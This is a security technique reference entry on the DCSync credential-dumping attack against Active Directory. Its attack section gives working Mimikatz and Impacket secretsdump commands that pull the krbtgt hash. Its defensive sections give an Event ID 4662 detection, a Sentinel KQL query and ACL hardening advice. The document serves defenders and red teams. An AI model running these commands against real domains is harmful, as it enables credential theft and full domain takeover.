# [CA-DUMP-002]: DCSync Domain Controller Sync Attack

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-002 |
| **MITRE ATT&CK v18.1** | [OS Credential Dumping: DCSync (T1003.006)](https://attack.mitre.org/techniques/T1003/006/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Abuse of the Directory Replication Service Remote Protocol (MS-DRSR) to mimic a Domain Controller. An attacker with "Replicating Directory Changes" permissions can request password data (hashes) for any user, including the KRBTGT, effectively compromising the entire domain without logging into a DC.
- **Attack Surface:** The AD Replication mechanism (DRSUAPI).
- **Business Impact:** **Total Domain Compromise**. Attackers can create Golden Tickets (via KRBTGT hash) for indefinite persistence.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:**
    - `DS-Replication-Get-Changes`
    - `DS-Replication-Get-Changes-All`
    - (Usually held by Domain Admins or compromised Service Accounts).
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [Impacket (secretsdump.py)](https://github.com/fortra/impacket)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Exploitation (Dump Specific User)**
Dump the hash of the `krbtgt` account to create a Golden Ticket, or `Administrator` for direct access.
```powershell
# Using Mimikatz
lsadump::dcsync /domain:target.local /user:krbtgt
```

**Step 2: Exploitation (Impacket - Remote)**
Perform DCSync remotely from a Linux box if you have credentials.
```bash
secretsdump.py target.local/administrator:password@192.168.1.10 -just-dc-user krbtgt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4662 | Object Type = `Domain-DNS`, Access Mask = `0x100` (Control Access), Properties include `{1131f6aa-...}` (Replication) |

#### 5.2 Microsoft Sentinel (KQL)
Detects replication requests coming from non-DC IP addresses.
```kusto
SecurityEvent
| where EventID == 4662
| where ObjectType == "%{19195a5b-6da0-11d0-a9dd-00c04fd8d503}" // Domain-DNS Class
| where AccessMask == "0x100"
| extend Properties = extract("Properties: (.*)", 1, EventData)
| where Properties has "{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}" // DS-Replication-Get-Changes-All
// Exclude known Domain Controllers
| where Computer !in (KnownDCs)
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **ACL Analysis:** Audit the root of the domain object for `DS-Replication-Get-Changes` rights. Ensure ONLY Domain Controllers and legitimate AAD Connect accounts have this.
*   **Tiering:** Strictly enforce Tier 0 separation. No user with DCSync rights should ever log into a workstation.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-001] (Compromise of a privileged account)
> **Next Logical Step:** [LAT-AD-003] (Golden Ticket Creation)
